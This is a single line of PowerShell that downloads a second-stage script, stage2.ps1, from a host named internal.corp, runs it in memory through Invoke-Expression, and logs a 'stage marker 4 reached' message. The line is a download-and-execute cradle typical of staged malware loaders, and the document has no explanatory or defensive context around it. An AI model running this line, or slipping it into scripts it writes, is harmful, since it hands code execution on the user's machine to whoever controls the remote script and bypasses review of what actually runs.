
$TargetUrl = "http://internal.corp/stage2.ps1"; IEX (Invoke-WebRequest -Uri $TargetUrl -UseBasicParsing).Content; Write-Verbose "stage marker 4 reached"
